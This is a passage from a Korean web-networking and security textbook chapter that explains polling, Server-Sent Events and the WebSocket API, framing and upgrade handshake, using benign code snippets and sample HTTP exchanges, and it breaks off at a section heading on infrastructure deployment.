# 37장. 실시간 채널: SSE, WebSocket, WebRTC

> **이 장에서 다루는 것**
>
> - 폴링에서 롱 폴링, 스트리밍, 양방향 채널, P2P까지 — 실시간 전송의 스펙트럼이 지연·오버헤드·복잡도를 어떻게 맞바꾸는가
> - WebSocket 핸드셰이크가 HTTP인 탓에 쿠키가 자동으로 실리고, 업그레이드가 끝난 뒤에는 HTTP 계층의 통제가 사라진다는 사실
> - `Origin` 헤더가 검증되지 않으면 아무것도 막지 못하는 이유, 그리고 CSWSH가 단방향 CSRF를 양방향 데이터 탈취로 바꾸는 방식
> - WebRTC가 브라우저를 브라우저와 직접 잇는 순간 나타나는 새 신뢰 경계 — 4장이 세운 UDP·NAT·DTLS가 그 경계에서 하는 일
> - 세 채널 각각이 (a) 어떤 신뢰 경계를 새로 만들고 (b) HTTP 계층의 무엇을 우회하며 (c) 무엇으로 방어되는가

Part VII의 앞선 다섯 장은 하나의 통신 모델을 공유했다. **클라이언트가 요청하고 서버가 응답한다.** XSS도, CSRF도, CORS 오설정도 모두 이 요청-응답 순환 위에서 벌어졌다. 34장이 그 순환을 스크립트로 조종하는 XMLHttpRequest까지 다뤘고, 34.9절이 그 순환으로 실시간을 흉내 내는 두 방법 — 폴링과 롱 폴링 — 을 다뤘다. 그리고 그 절은 답이 아니라 질문으로 끝났다. **요청-응답 순환은 서버가 클라이언트에게 먼저 말을 걸 방법을 주지 않는다.**

이 장은 그 순환을 벗어나는 세 가지 방법을 다룬다. **Server-Sent Events**는 서버가 클라이언트로 한 방향으로 밀어 넣는다. **WebSocket**은 양쪽이 언제든 말할 수 있는 채널을 연다. **WebRTC**는 아예 서버를 빼고 브라우저와 브라우저를 직접 잇는다. 셋은 성능 특성만 다른 것이 아니다. **셋은 각자 다른 신뢰 경계를 만든다.**

이 책의 논지가 이 장에서 특히 선명하다. 실시간 채널은 새로운 공격 기법을 발명하지 않았다. 그것들은 커넥션을 오래 살리고, 프레이밍을 HTTP가 아닌 것으로 바꾸고, 요청마다 이뤄지던 판정을 커넥션 수립 시점의 단 한 번으로 압축했다. **이 세 가지 변화가 이 책이 지금까지 세운 경계들 — 동일 출처, 세션 확인, 중간자 검사 — 을 어디서 무너뜨리는가.** 이것이 이 장이 답해야 하는 질문이며, 37.7절과 37.14절이 그것을 정면으로 받는다.

## 37.1 실시간이 필요할 때 — 폴링, 롱 폴링, 스트리밍, 푸시의 스펙트럼

34.9절이 정확한 출발점을 세워 두었다. **HTTP는 서버가 클라이언트로 새 커넥션을 시작할 방법을 제공하지 않는다.** 이것은 구현의 미비가 아니라 프로토콜의 근본 형태다. 그래서 "서버에서 갱신이 생겼을 때 클라이언트에게 알린다"는 요구는 HTTP 위에서 언제나 우회로를 통해서만 충족된다. 그 우회로들이 하나의 스펙트럼을 이룬다.

먼저 용어를 다시 못 박아 둔다. **"실시간"은 애플리케이션마다 다른 것을 뜻한다.** 밀리초 이하의 지연이 필요한 화상 통화가 있고, 30초 지연으로 충분한 주문 상태 알림이 있다. 최적의 전송 수단을 고르려면 먼저 애플리케이션의 **지연 목표와 오버헤드 예산**을 정의해야 한다. 이 정의 없이는 어떤 채널이 맞는지 말할 수 없다.

스펙트럼의 다섯 지점을 정리한다.

**표 37-1. 실시간 전송 수단의 스펙트럼**

| 방식 | 방향 | 지연 | 메시지당 오버헤드 | 커넥션 | 구현 복잡도 | 참조 |
|---|---|---|---|---|---|---|
| **폴링** | C→S 요청, S→C 응답 | 폴링 간격의 절반(평균) | 매 요청 HTTP 헤더 전체(약 800바이트+쿠키) | 지속 커넥션 재사용 가능 | 최소 | → 34.9 |
| **롱 폴링** | C→S 요청, S가 붙들었다 응답 | 최선(전파 지연만) | 매 메시지 HTTP 헤더 전체 | 메시지마다 재수립 | 낮음 | → 34.9 |
| **SSE** | **S→C 단방향** | 최선(전파 지연만) | 메시지당 최소 약 5바이트 | 단일 장수명 HTTP 응답 | 낮음 | → 37.2 |
| **WebSocket** | **양방향** | 최선(전파 지연만) | 프레임당 2~14바이트 | 단일 장수명 TCP | 중간(커스텀 프로토콜) | → 37.4 |
| **WebRTC DataChannel** | **양방향 P2P** | 최선(서버 홉 없음) | UDP+DTLS+SCTP 약 130바이트 | P2P UDP | 높음 | → 37.12 |

이 표에서 세 가지 축을 읽어야 한다.

**지연.** 폴링만이 구조적으로 지연을 만든다. 메시지가 서버에 준비된 시점과 다음 폴링 사이의 간격이 그것이다. 나머지 넷은 모두 **큐잉 지연을 제거한다** — 메시지가 준비되는 즉시 전달한다. 단, 어떤 방식도 전파 지연 자체를 줄이지 못한다. 전송 수단을 바꿔도 패킷은 빛의 속도보다 빨리 가지 못한다. SSE와 WebSocket의 "저지연"이 정확히 뜻하는 것은 **큐잉 지연의 제거**이지 왕복 시간의 단축이 아니다.

**오버헤드.** 폴링과 롱 폴링은 전달되는 메시지 하나하나가 독립적인 HTTP 요청이므로 매번 800바이트 안팎의 헤더와 쿠키를 문다(→ 34.9). SSE는 장수명 응답 위에 이벤트를 흘려보내므로 메시지당 수 바이트로 떨어진다. WebSocket은 프레임 헤더 2~14바이트만 문다. 이 차이가 고빈도 갱신에서 수십 배로 벌어진다.

**방향과 커넥션의 수명.** 이것이 이 장의 보안 논의를 지배하는 축이다. 폴링은 매 요청이 짧고, 서버는 요청받을 때마다 판정한다. SSE·WebSocket·WebRTC는 커넥션이 오래 산다. **판정은 커넥션 수립 시점에 한 번 이뤄지고, 그 뒤 몇 시간 동안 재확인되지 않는다.** 요청마다 붙던 쿠키·헤더 검사가 첫 핸드셰이크 한 번으로 압축된다는 이 사실이, 37.7절과 37.14절이 다룰 모든 문제의 뿌리다.

이 절의 나머지는 스펙트럼의 오른쪽 세 지점을 하나씩 펼친다. SSE부터 시작한다.

> **이 절이 뒷받침하는 것**
>
> - HTTP는 서버가 커넥션을 시작할 수 없다 → **34.9** (폴링·롱 폴링이 이 제약의 우회로)
> - 커넥션의 수명이 판정의 빈도를 결정한다 → **37.7**, **37.14** (장수명 채널의 공통 취약 구조)

## 37.2 Server-Sent Events — EventSource API, 이벤트 스트림 프로토콜

**Server-Sent Events(SSE)** 는 서버에서 클라이언트로 텍스트 이벤트 데이터를 효율적으로 스트리밍하기 위한 것이다. 실시간 알림, 서버가 생성한 갱신 같은 것이 대상이다. SSE는 두 요소로 이 목표를 이룬다. 브라우저의 **`EventSource` 인터페이스** — 클라이언트가 서버의 푸시 알림을 DOM 이벤트로 받게 한다 — 와 개별 갱신을 실어 나르는 **이벤트 스트림(event stream) 데이터 형식**이다.

내부를 보면 SSE는 34.8절이 다룬 XHR 스트리밍을 크로스브라우저로 효율화한 것이다. 메시지는 **단일 장수명 HTTP 응답** 위로 전달된다. 그러나 XHR 스트리밍을 직접 다룰 때와 달리, 브라우저가 커넥션 관리와 메시지 파싱을 전부 처리한다.

### EventSource API

클라이언트 API는 놀랄 만큼 작다. 이벤트 스트림 리소스의 URL을 주고 리스너를 등록하면 끝이다.

```javascript
var source = new EventSource("/path/to/stream-url");

source.onopen  = function () { ... };   // 커넥션 수립 시
source.onerror = function () { ... };   // 커넥션 실패 시

source.addEventListener("foo", function (event) {
  processFoo(event.data);               // 타입이 "foo"인 이벤트 구독
});

source.onmessage = function (event) {   // 타입 없는 모든 이벤트
  log_message(event.id, event.data);
  if (event.id == "CLOSE") { source.close(); }
};
```

커넥션 협상, 수신 데이터의 점진적 파싱, 메시지 경계 식별, DOM 이벤트 발화가 모두 브라우저의 몫이다. 애플리케이션은 비즈니스 로직에만 집중한다. 여기서 보안상 짚어 둘 성질이 하나 있다. **`EventSource`는 일반 XHR과 같은 CORS 권한·옵트인 워크플로로 원격 출처의 이벤트를 스트리밍할 수 있다(→ 34.7).** 즉 SSE의 출처 통제는 이미 34장에서 다룬 CORS 그대로다 — 새로운 통제 축을 도입하지 않는다.

`EventSource`는 두 가지를 더 준다. **자동 재연결**과 **마지막으로 본 메시지 추적**이다. 커넥션이 끊기면 브라우저가 자동으로 다시 연결하고, 선택적으로 마지막으로 본 메시지의 ID를 알린다. 그러면 스트림을 재개하고 놓친 메시지를 재전송할 수 있다.

### 이벤트 스트림 프로토콜

SSE 이벤트 스트림은 스트리밍 HTTP 응답으로 전달된다. 클라이언트가 평범한 HTTP 요청을 보내고, 서버는 `text/event-stream` 콘텐츠 타입으로 응답한 뒤 UTF-8 이벤트 데이터를 흘려보낸다.

```
=> 요청
GET /stream HTTP/1.1
Host: www.joes-hardware.com
Accept: text/event-stream

<= 응답
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/event-stream
Transfer-Encoding: chunked

retry: 15000

data: 첫 메시지는 단순 문자열.

data: {"message": "JSON 페이로드"}

event: foo
data: "foo" 타입 메시지

id: 42
event: bar
data: id "42", 타입 "bar"의
data: 여러 줄 메시지
```

프로토콜은 사소할 만큼 단순하다.

- 이벤트 페이로드는 **하나 이상의 인접한 `data` 필드의 값**이다.
- 이벤트는 선택적 **ID**와 **이벤트 타입** 문자열을 가질 수 있다.
- **이벤트 경계는 빈 줄(개행)로 표시된다.**

수신 쪽에서 `EventSource`는 개행을 찾아 스트림을 파싱하고, `data` 필드에서 페이로드를 뽑고, 선택적 ID와 타입을 확인한 뒤 DOM 이벤트를 발화한다. 타입이 있으면 해당 커스텀 이벤트가, 없으면 일반 `onmessage` 콜백이 호출된다.

`retry` 지시자는 커넥션이 끊겼을 때 클라이언트의 재연결 간격을 서버가 정하는 값이다. 명세는 2~3초를 권고한다. 그리고 서버가 각 메시지에 ID를 붙이면, 브라우저는 마지막으로 본 ID를 기억했다가 재연결 요청에 **`Last-Event-ID` 헤더**로 자동으로 실어 보낸다.

```
=> 재연결 요청 (커넥션이 끊긴 4.5초 뒤 자동 발생)
GET /stream HTTP/1.1
Host: www.joes-hardware.com
Accept: text/event-stream
Last-Event-ID: 43
```

클라이언트는 재연결이나 마지막 ID 기억을 위한 코드를 전혀 쓰지 않는다. 전 과정이 브라우저의 몫이고, 복구 전략만 서버가 정한다. 놓친 메시지의 손실을 허용하면 ID도 특별한 로직도 필요 없다. 복구가 필요하면 서버가 관련 이벤트에 ID를 붙이고, 재연결 시 보고된 마지막 ID로부터 놓친 메시지를 재전송할 로컬 캐시를 구현하면 된다.

한 가지 제약을 명시한다. **모든 SSE 데이터는 UTF-8이다.** SSE는 바이너리 페이로드 전송용이 아니다. 바이너리가 필요하면 base64로 인코딩할 수는 있으나 33%의 바이트 오버헤드를 문다. 스트림 자체는 다른 HTTP 응답처럼 gzip으로 압축할 수 있으므로, UTF-8의 라인 오버헤드가 걱정이라면 서버에서 압축을 켜면 된다. 바이너리가 진짜 필요하면 WebSocket이 맞는 도구다.

## 37.3 SSE 사용 사례와 성능·한계

SSE는 서버→클라이언트 텍스트 실시간 데이터 스트리밍의 고성능 전송 수단이다. 메시지가 서버에서 준비되는 즉시 밀어 보낼 수 있고(저지연), 메시지 오버헤드가 최소이며(장수명 커넥션, 간결한 이벤트 스트림 프로토콜, gzip), 브라우저가 모든 파싱을 처리하고, 무한정 커지는 버퍼가 없다. `EventSource`의 자동 재연결과 DOM 이벤트 알림까지 더하면, 실시간 텍스트 데이터를 다루는 데 SSE는 간단하면서도 충분하다.

SSE의 한계는 두 가지다. **첫째, 서버→클라이언트 단방향이다.** 클라이언트가 서버로 데이터를 스트리밍하는 요구 — 예컨대 큰 업로드 — 는 다루지 못한다. **둘째, UTF-8 전용이다.** 바이너리 스트리밍은 가능하나 비효율적이다.

UTF-8 제약은 흔히 애플리케이션 계층에서 우회된다. SSE로 "서버에 새 바이너리 자산이 있다"는 알림만 보내고, 애플리케이션이 그것을 XHR로 가져오는 것이다. 왕복 지연이 한 번 더 붙지만, 대신 XHR이 제공하는 서비스 — 응답 캐싱, 전송 인코딩(압축) — 를 그대로 활용한다.

### SSE와 중간자

이 절에서 이 책의 관점으로 짚을 것이 하나 있다. **SSE는 평범한 HTTP 커넥션 위의 스트리밍 응답이다.** 서버에 배포하기 쉽고 클라이언트에서 폴리필하기 쉬운 것이 그 덕분이지만, 동시에 이것이 SSE를 중간자 문제에 노출시킨다.

SSE를 이해하지 못하는 프록시나 방화벽은 **이벤트 스트림 데이터를 버퍼링하려 들 수 있다.** 스트리밍 응답은 "아직 끝나지 않은 응답"이므로, 응답 전체를 모아서 전달하려는 중간자는 이벤트를 붙잡아 둔다. 그 결과는 지연 증가이거나, SSE 커넥션의 완전한 붕괴다. 이것은 9.7절의 멍청한 프록시 문제와 13.11절의 잘못 구현된 릴레이가 스트리밍 트랜스포트에서 재현되는 형태다. 중간자가 응답의 프레이밍을 자기 방식으로 해석하는 순간 스트림이 깨진다.

원서의 처방은 명확하다. 이런 문제를 겪으면 **SSE를 TLS 커넥션 위로 전달하라.** `wss://`가 WebSocket에서 하는 것과 같은 논리다(→ 37.7). 종단 간 암호화된 통로 안에서는 경로상의 SSE 비인식 중간자가 스트림을 열어 버퍼링하거나 변형할 수 없다. TLS는 여기서 기밀성뿐 아니라 **프레이밍의 온전함**을 지키는 수단이다.

> **이 절이 뒷받침하는 것**
>
> - SSE의 출처 통제는 CORS 그대로다 → **34.7** (단순·사전·자격증명 요청)
> - 스트리밍 응답을 버퍼링하는 중간자 → **9.7**(멍청한 프록시), **13.11**(릴레이)
> - TLS로 프레이밍을 지킨다 → **37.7** (WSS 권고와 같은 논리)

## 37.4 WebSocket API — WS/WSS 스킴, 텍스트·바이너리 송수신, 서브프로토콜 협상

**WebSocket**은 클라이언트와 서버 사이에서 텍스트와 바이너리 데이터를 양방향·메시지 지향으로 스트리밍한다. 브라우저에서 원시 네트워크 소켓에 가장 가까운 API이지만, 소켓 이상이기도 하다. 브라우저가 복잡성을 감추면서 커넥션 협상과 동일 출처 정책 집행, 기존 HTTP 인프라와의 상호운용, 효율적 메시지 프레이밍, 서브프로토콜 협상과 확장성을 얹어 준다.

### WebSocket API

API는 앞 절의 `EventSource`와 의도적으로 닮았다. WebSocket 리소스의 URL과 콜백 몇 개면 된다.

```javascript
var ws = new WebSocket('wss://www.joes-hardware.com/socket');

ws.onerror = function (error) { ... };
ws.onclose = function () { ... };

ws.onopen = function () {
  ws.send("커넥션 수립. 서버야 안녕!");   // 클라이언트가 서버로 메시지
};

ws.onmessage = function (msg) {
  if (msg.data instanceof Blob) { processBlob(msg.data); }
  else                          { processText(msg.data); }
};
```

`EventSource`와 결정적으로 다른 점은 **양방향**이라는 것이다. `onopen` 안에서 클라이언트가 곧바로 `send()`로 서버에 말을 걸 수 있다. SSE에서는 초기 핸드셰이크 이후 클라이언트가 서버로 아무것도 보내지 못했다.

### WS와 WSS 스킴

WebSocket 리소스 URL은 자체 스킴을 쓴다. 평문은 `ws://`, TLS로 암호화된 채널은 `wss://`다. 왜 익숙한 `http`가 아니라 커스텀 스킴인가. WebSocket의 주 용도는 브라우저와 서버 사이의 최적화된 양방향 채널이지만, 와이어 프로토콜 자체는 브라우저 밖에서도 쓸 수 있고 비HTTP 교환으로 협상될 수도 있다. 그래서 커스텀 스킴을 택했다. 다만 실무에서는 브라우저 밖 대안 핸드셰이크의 표준이 존재하지 않는다.

`wss://`는 성능·보안·상호운용성 모두에서 권장되는 기본값이다. 그 이유는 37.7절에서 완결한다.

### 텍스트와 바이너리 데이터

WebSocket 통신은 메시지로 이뤄진다. 애플리케이션은 버퍼링·파싱·재구성을 걱정할 필요가 없다. 서버가 1MB 페이로드를 보내면, 메시지 전체가 클라이언트에 도착했을 때 비로소 `onmessage`가 호출된다. 프로토콜은 페이로드에 대해 아무 가정도 하지 않는다. 내부적으로 추적하는 것은 두 가지뿐 — **페이로드 길이**와, UTF-8인지 바이너리인지를 구분하는 **타입**이다.

텍스트는 `DOMString`으로, 바이너리는 기본적으로 `Blob`으로 전달된다. 바이너리를 메모리에 두고 처리하려면 `binaryType`을 `"arraybuffer"`로 바꾸는 힌트를 줄 수 있다. `Blob`은 수정·분할이 필요 없는 파일 같은 불변 데이터에 최적이고, 추가 처리가 필요하면 `ArrayBuffer`가 낫다.

송신도 대칭이다. `DOMString`은 UTF-8로 인코딩되어 나가고, `ArrayBuffer`·`ArrayBufferView`·`Blob`은 바이너리로 나간다. 다만 **와이어에서 프레임은 바이너리냐 텍스트냐를 단 1비트로 표시할 뿐이다.** 애플리케이션이나 서버가 페이로드에 대한 다른 콘텐츠 타입 정보를 원하면, 별도 메커니즘으로 그것을 전달해야 한다.

`send()`는 비동기다. 데이터를 큐에 넣고 즉시 반환한다. 큰 페이로드를 보낼 때 빠른 반환을 "전송 완료"로 착각하면 안 된다. 얼마나 큐에 쌓였는지는 `bufferedAmount`로 조회한다. 이것이 중요한 이유는 **모든 WebSocket 메시지가 큐에 넣은 정확한 순서로 전달되기 때문이다.** 큐에 쌓인 큰 백로그나 단 하나의 큰 메시지가 뒤의 메시지 전달을 막는다 — 헤드 오브 라인 블로킹이다(→ 3.6). 큰 메시지를 작은 조각으로 쪼개거나 우선순위 큐를 직접 구현하는 것이 우회책이다.

### 서브프로토콜 협상

WebSocket 프로토콜은 메시지 형식에 대해 아무 가정도 하지 않는다. HTTP나 XHR과 달리 각 메시지에 메타데이터를 실을 헤더 같은 것이 없다. 그래서 메시지에 대한 추가 메타데이터가 필요하면 클라이언트와 서버가 **자기들만의 서브프로토콜을 합의해 구현해야 한다.** 미리 고정 형식(전부 JSON, 또는 커스텀 바이너리)을 정하거나, 일관된 메시지 헤더를 두거나, 텍스트·바이너리 메시지를 섞어 쓰는 식이다.

직렬화 형식을 정한 뒤에도 남는 문제 — 클라이언트와 서버가 서로를 이해하는지, 어떻게 동기화하는지 — 를 위해 WebSocket은 간단한 서브프로토콜 협상 API를 준다. 클라이언트가 지원 프로토콜 목록을 초기 핸드셰이크에서 광고한다.

```javascript
var ws = new WebSocket('wss://www.joes-hardware.com/socket',
                       ['appProtocol', 'appProtocol-v2']);

ws.onopen = function () {
  if (ws.protocol == 'appProtocol-v2') { ... }
  else                                 { ... }
};
```

서버는 광고된 것 중 하나를 고른다. 협상이 성공하면 `onopen`이 발화하고 `protocol` 속성으로 선택된 프로토콜을 알 수 있다. 서버가 어느 것도 지원하지 않으면 핸드셰이크가 미완으로 끝나고 `onerror`가 발화하며 커넥션이 종료된다.

## 37.5 WebSocket 프로토콜 — 바이너리 프레이밍, 프로토콜 확장, HTTP 업그레이드 협상

WebSocket 와이어 프로토콜(RFC 6455)은 두 부분으로 이뤄진다. 커넥션 파라미터를 협상하는 **개시 HTTP 핸드셰이크**와, 텍스트·바이너리를 저오버헤드로 실어 나르는 **바이너리 메시지 프레이밍**이다.

### 바이너리 프레이밍 계층

애플리케이션은 메시지 지향 API로 대화한다. 송신자가 임의의 UTF-8 또는 바이너리 페이로드를 주면, 수신자는 메시지 전체가 도착했을 때 통보받는다. 이를 위해 WebSocket은 각 메시지를 하나 이상의 **프레임(frame)** 으로 쪼개 전송하고 재조립한다. 3.1.2절이 세운 사실 — **TCP는 바이트 스트림이며 메시지 경계를 알려주지 않는다** — 을 여기서 프레이밍 계층이 메운다. WebSocket은 TCP가 주지 않는 메시지 경계를 프레임 헤더로 다시 세우는 것이다(→ 3.1.2). 프레임은 통신의 최소 단위이고, 메시지는 논리적 애플리케이션 메시지에 대응하는 프레임의 완전한 연쇄다. 메시지를 몇 개 프레임으로 쪼갤지는 하부 구현이 정하며, 애플리케이션은 개별 프레임을 의식하지 않는다.

와이어 상의 프레임 구조에서 보안상 주목할 것은 다음이다.

- 각 프레임의 첫 비트(**FIN**)는 이 프레임이 메시지의 마지막 조각인지 나타낸다. 메시지는 단일 프레임일 수도 있다.
- **opcode**(4비트)는 프레임 타입을 나타낸다. 텍스트(1)·바이너리(2)는 애플리케이션 데이터, 커넥션 종료(8)·핑(9)·퐁(10)은 커넥션 생존 확인용 제어 프레임이다.
- **mask 비트**는 페이로드가 마스킹되었는지 나타낸다. **클라이언트→서버 방향에서만** 마스킹된다.
- **페이로드 길이**는 가변 길이 필드다(0~125면 그 자체, 126이면 다음 2바이트, 127이면 다음 8바이트가 길이).
- **마스킹 키**는 페이로드를 마스킹하는 32비트 값이다.

마스킹은 성능이 아니라 보안 기능이다. **클라이언트가 개시한 모든 프레임의 페이로드는 프레임 헤더에 실린 키로 마스킹된다.** 목적은 하나다. 클라이언트에서 실행되는 악성 스크립트가, WebSocket 프로토콜을 이해하지 못하는 중간자를 상대로 **캐시 포이즈닝 공격**을 수행하는 것을 막는 것이다. WebSocket 프레임을 HTTP 요청으로 오독할 수 있는 중간자에게, 마스킹은 페이로드를 예측 불가능하게 만들어 그런 오독을 이용한 주입을 봉쇄한다. 이 방어가 필요했다는 사실 자체가, WebSocket 트래픽이 지나는 경로에 그것을 이해하지 못하는 중간자가 있다는 이 장의 전제를 확인해 준다(→ 37.7).

프레이밍 오버헤드는 서버 프레임당 2~10바이트, 클라이언트 프레임은 마스킹 키 4바이트가 더해져 6~14바이트다. 헤더 필드 같은 다른 메타데이터는 일절 없다. 모든 통신이 페이로드를 불투명한 덩어리로 취급하는 프레임 교환으로 이뤄진다.

WebSocket은 헤드 오브 라인 블로킹에 노출된다. 메시지는 여러 프레임으로 쪼갤 수 있으나, 서로 다른 메시지의 프레임을 끼워 넣을 수 없다 — HTTP/2의 스트림 ID(→ 11.7)에 해당하는 것이 없기 때문이다. 큰 메시지 하나가 다른 메시지의 프레임 전달을 막는다. 그리고 코어 명세에 다중화가 없으므로 **각 WebSocket 커넥션은 전용 TCP 커넥션을 요구한다.** HTTP/1.x 배포에서 오리진당 커넥션 한도(→ 9.4)에 부딪히는 잠재적 문제다.

### 프로토콜 확장

WebSocket은 프로토콜 확장을 허용한다. 새 opcode와 데이터 필드로 와이어 형식과 의미를 확장할 수 있다. HyBi 워킹그룹이 개발한 공식 확장은 두 가지다. **다중화 확장**은 채널 ID로 여러 논리적 WebSocket 커넥션이 하나의 TCP 커넥션을 공유하게 한다. **압축 확장**은 HTTP의 전송 인코딩 협상에 해당하는 기능을 WebSocket에 더한다. 기본 명세는 압축 메커니즘을 전혀 제공하지 않으므로, 확장이 없으면 애플리케이션이 직접 압축 로직을 구현해야 한다. 확장을 켜려면 클라이언트가 초기 업그레이드 핸드셰이크에서 광고하고 서버가 선택·확인해야 한다.

### HTTP 업그레이드 협상

이것이 이 장의 보안 논의로 이어지는 핵심 절이다. WebSocket 핸드셰이크에 HTTP를 쓰는 데는 이유가 있다. 첫째, **기존 HTTP 인프라와 호환된다.** WebSocket 서버가 80·443 포트 위에서 돌 수 있는데, 이 두 포트가 클라이언트에게 유일하게 열린 포트인 경우가 잦다. 둘째, HTTP의 업그레이드 흐름을 재사용해 커스텀 헤더로 협상할 수 있다.

이 업그레이드 흐름은 11.12절이 다룬 프로토콜 협상의 한 사례다. 그리고 **업그레이드는 홉 단위(hop-by-hop) 협상**이라는 사실이 여기서 결정적이다(→ 9.2). `Upgrade`와 `Connection` 헤더는 커넥션의 한 홉에만 적용되며, 다음 홉으로 전달되지 않는 것이 원칙이다. 경로에 프록시가 있으면 그 프록시가 업그레이드를 이해하고 다음 홉으로 이어 줘야 한다. 이해하지 못하는 중간자가 있으면 문제가 생긴다 — 9.2절이 `Connection` 헤더의 함정으로 예고한 바로 그 문제가, WebSocket 업그레이드에서 실물이 된다.

협상에 쓰이는 헤더는 다음과 같다.

| 헤더 | 방향 | 역할 |
|---|---|---|
| `Sec-WebSocket-Version` | 클라이언트 | 프로토콜 버전("13"이 RFC 6455) |
| `Sec-WebSocket-Key` | 클라이언트 | 서버가 프로토콜을 이해하는지 시험하는 자동 생성 챌린지 |
| `Sec-WebSocket-Accept` | 서버 | Key를 서명한 값 — 프로토콜을 이해함을 증명 |
| `Sec-WebSocket-Protocol` | 양방향 | 서브프로토콜 협상 |
| `Sec-WebSocket-Extensions` | 양방향 | 확장 협상 |

핸드셰이크의 실제 모습이다.

```
GET /socket HTTP/1.1
Host: thirdparty.example
Origin: http://books.example.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Protocol: appProtocol, appProtocol-v2
Sec-WebSocket-Extensions: x-webkit-deflate-message, x-custom-extension
```

여기서 두 줄에 주목한다. **`Origin` 헤더는 브라우저가 자동으로 붙인다.** 다른 브라우저 개시 커넥션과 마찬가지로 WebSocket 요청도 동일 출처 정책의 대상이며, 서버는 CORS로 크로스 오리진 요청을 수락하거나 거부할 수 있다(→ 34.7). 이 `Origin` 줄이 37.7절 전체의 중심이 된다. 그리고 명시적으로 쿠키를 쓰지 않았지만, **이것이 HTTP 요청이므로 브라우저는 대상 도메인의 쿠키를 이 핸드셰이크에 자동으로 첨부한다.** 이것이 CSWSH의 뿌리다.

서버는 프로토콜 전환을 확인한다.

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Access-Control-Allow-Origin: http://books.example.com
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: appProtocol-v2
Sec-WebSocket-Extensions: x-custom-extension
```

`101 Switching Protocols`가 업그레이드를 확정한다. `Sec-WebSocket-Accept`는 클라이언트의 Key를 표준에 정의된 GUID와 이어 붙여 SHA-1 해시하고 base64로 인코딩한 값이다. 이 Key/Accept 교환은 **프로토콜을 이해하지도 못하면서 커넥션을 맹목적으로 "업그레이드"하는 서버나 중간자에 대한 보안 정책**이다. 그러나 명시적 프록시의 일부 배포 문제를 해결할 뿐, **트래픽을 몰래 분석·변형하는 투명 프록시(transparent proxy)에 대해서는 불충분하다.** 이 한계가 37.6·37.7절의 프록시 통과 논의로 직접 이어진다.

**핸드셰이크가 성공하면, 이후 클라이언트와 서버 사이에 다른 명시적 HTTP 통신은 없다.** WebSocket 프로토콜이 커넥션을 넘겨받는다. 이 한 문장이 이 장에서 가장 무거운 문장이다. HTTP 계층이 개입할 수 있는 시점은 핸드셰이크 한 번뿐이고, 그 뒤로는 커넥션이 HTTP를 이해하는 어떤 통제의 시야에서도 벗어난다.

> **이 절이 뒷받침하는 것**
>
> - 업그레이드는 홉 단위 협상이다 → **9.2**(Connection 헤더의 함정), **11.12**(프로토콜 협상)
> - `Origin` 자동 첨부와 쿠키 자동 첨부 → **37.7** (Origin 검증과 CSWSH)
> - 업그레이드 후 HTTP 통제의 시야를 벗어남 → **12.11**(WAF), **13.12**(중간자 공격 표면)

## 37.6 WebSocket 사용 사례와 성능 — 메시지 오버헤드, 압축, 인프라 배포

WebSocket은 같은 TCP 커넥션 위에서 양방향 통신을 허용하는 유일한 브라우저 전송 수단이다. 클라이언트와 서버가 언제든 메시지를 교환한다. XHR이 트랜잭션형 요청-응답에 최적화되어 있고, SSE가 서버→클라이언트 단방향인 것과 대비된다.

여기서 34.9절과 37.1절이 강조한 것을 다시 못 박는다. 전송 수단을 XHR에서 SSE나 WebSocket으로 바꿔도 **왕복 시간 자체는 줄지 않는다.** 데이터 패킷의 전파 지연은 전송 수단과 무관하다. 줄어드는 것은 **큐잉 지연** — 메시지가 상대에게 라우팅되기 전에 대기하는 시간 — 이다. 폴링에서는 이 큐잉 지연이 폴링 간격의 함수였다. SSE와 WebSocket은 장수명 커넥션으로 서버가(WebSocket은 클라이언트도) 메시지가 준비되는 즉시 발송하게 해 이 지연을 제거한다.

### 메시지 오버헤드

수립된 WebSocket 커넥션에서 애플리케이션 메시지는 프레임당 2~14바이트의 오버헤드를 문다. 다른 전송 수단과 비교한다.

**표 37-2. 메시지당 애플리케이션 계층 오버헤드 (HPBN 17장 기준)**

| 전송 수단 | 메시지당 오버헤드 | 제약 |
|---|---|---|
| SSE | 최소 약 5바이트 | UTF-8 전용 |
| **WebSocket** | 2~14바이트 | 텍스트·바이너리 모두 |
| HTTP/1.x (XHR 등) | 500~800바이트 + 쿠키 | 요청마다 헤더 전체 |
| HTTP/2 | 헤더 불변 시 8바이트까지 | 헤더 압축(HPACK, → 11.11) |

이 수치들은 IP·TCP·TLS 프레이밍의 오버헤드(메시지당 60~100바이트)를 포함하지 않는다. 그 오버헤드는 애플리케이션 프로토콜과 무관하게 붙는다.

### 데이터 효율과 압축

압축에서는 상황이 복잡하다. XHR은 HTTP 협상으로 최적 전송 인코딩을 정하고, SSE는 UTF-8 전용이므로 세션 전체에 gzip을 적용하면 된다. **그러나 WebSocket은 텍스트와 바이너리를 모두 나르므로 세션 전체를 압축하는 것이 말이 안 된다.** 바이너리 페이로드는 이미 압축되어 있을 수 있다. 그래서 WebSocket은 자체 압축 메커니즘을 구현해 메시지별로 선택적으로 적용해야 한다. 표준화된 메시지별 압축 확장이 있으나 배포가 고르지 않으므로, 애플리케이션이 바이너리 페이로드를 최적화하고 텍스트 메시지용 압축 로직을 직접 두는 편이 안전하다.

### 커스텀 프로토콜의 대가

브라우저는 HTTP 데이터 전송에 최적화되어 있다. HTTP를 이해하므로 인증·캐싱·압축 등 광범위한 서비스를 제공하고, XHR 요청은 이 모두를 공짜로 물려받는다. **반면 WebSocket으로 커스텀 프로토콜을 나르는 것은 브라우저가 제공하는 이 서비스들을 우회하는 대가를 치른다.** 초기 HTTP 핸드셰이크에서 일부 협상은 되지만, 세션이 수립된 뒤 오가는 모든 데이터는 브라우저에게 불투명하다. 그래서 캐싱·상태 관리·메타데이터 전달을 애플리케이션이 직접 채워야 한다.

이 우회에는 보안적 함의가 있다. WebSocket으로 이미지를 바이너리로 스트리밍하면 오버헤드 없이 나를 수 있지만, **그 이미지는 브라우저 캐시나 어떤 중간자(CDN 포함)에도 캐싱되지 않는다.** 실전 전략은 WebSocket 세션으로 캐싱 불가능한 데이터 — 실시간 갱신, 제어 메시지 — 만 나르고, 그것이 다른 자산을 HTTP로 가져오는 XHR 요청을 촉발하게 하는 것이다.

### 인프라 배포

